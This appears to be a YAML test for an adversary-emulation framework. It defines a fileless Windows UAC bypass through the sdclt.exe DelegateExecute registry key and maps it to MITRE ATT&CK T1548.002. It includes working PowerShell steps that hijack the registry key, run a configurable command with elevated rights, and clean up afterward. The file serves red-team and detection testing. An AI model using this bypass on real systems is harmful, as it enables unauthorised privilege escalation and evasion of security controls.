api_version: "2.0"
name: Bypass UAC using sdclt DelegateExecute
description: |
    Bypasses User Account Control using a fileless method, registry only.
    Upon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe
    [Reference - sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)
    Adapted from [MITRE ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)
args:
    - name: command_to_execute
      type: string
      default: cmd.exe /c notepad.exe
uuid: 3be891eb-4608-4173-87e8-78b494c029b7
mitre:
    tactics:
        - 'TA0004: Privilege Escalation'
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1548: Abuse Elevation Control Mechanism'
    subtechniques:
        - 'T1548.002: Bypass User Account Control'
requirements:
    platforms:
        - os: windows
steps:
    - name: bypass-uac-using-sdclt-delegateexecute
      inline: |
        New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value '{{.Args.command_to_execute}}'
        New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
        Start-Process -FilePath $env:windir\system32\sdclt.exe
        Start-Sleep -s 3
      executor: powershell
      cleanup:
        inline: |
            Remove-Item -Path "HKCU:\Software\Classes\Folder" -Recurse -Force -ErrorAction Ignore
        executor: powershell
